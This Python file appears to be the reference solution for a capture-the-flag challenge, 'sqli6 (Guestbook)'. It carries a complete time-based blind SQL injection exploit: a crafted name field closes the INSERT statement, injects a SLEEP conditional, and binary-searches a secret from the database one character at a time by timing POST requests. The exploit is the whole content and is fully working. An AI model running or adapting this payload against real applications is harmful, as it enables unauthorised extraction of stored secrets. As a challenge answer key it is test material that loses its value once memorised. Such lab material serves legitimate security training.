#!/usr/bin/env python3
"""Reference solve for sqli6 (Guestbook).

The sign-in form builds its INSERT by concatenation:

    INSERT INTO guestbook (name, message)
    VALUES ('<name>', '<message>')

so a name of the form

    x', (SELECT IF(<cmp>, SLEEP(0.5), 0)) ) --

closes the name string, injects an expression as the message value and
comments out the rest - two values for two columns, and the row is
saved only after the injected expression has run. <cmp> is

    (SELECT ascii(substring(secret,N,1)) FROM vault LIMIT 1) > M

so the POST takes half a second exactly when the Nth character of the
vault secret has a code above M. A sentinel comparison per position
detects the end of the secret; binary-searching M recovers each code.

    python solve.py                 # localhost:8035
    python solve.py http://host:8035
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8035")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
THRESHOLD = 0.25  # seconds; the injected SLEEP(0.5) must clear this


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    def cmp_at(pos: int) -> str:
        return (f"(SELECT ascii(substring(secret,{pos},1)) "
                f"FROM vault LIMIT 1)")

    def timed(cmp_expr: str) -> bool:
        name = f"x', (SELECT IF({cmp_expr}, SLEEP(0.5), 0)) ) -- "
        t0 = time.monotonic()
        s.post(BASE + "/", data={"name": name, "message": "hi"}, timeout=30)
        return (time.monotonic() - t0) >= THRESHOLD

    def char_at(pos: int) -> int:
        c = cmp_at(pos)
        if not timed(f"{c} IS NOT NULL AND {c} > 0"):
            return 0  # past the end of the secret
        lo, hi = 31, 127
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if timed(f"{c} > {mid}"):
                lo = mid
            else:
                hi = mid
        return hi

    text = ""
    pos = 1
    while pos <= 200:
        c = char_at(pos)
        if c == 0:
            break
        text += chr(c)
        if text.startswith("flag{") and text.endswith("}"):
            break
        pos += 1

    m = FLAG_RE.search(text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found in extracted text: {text!r}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
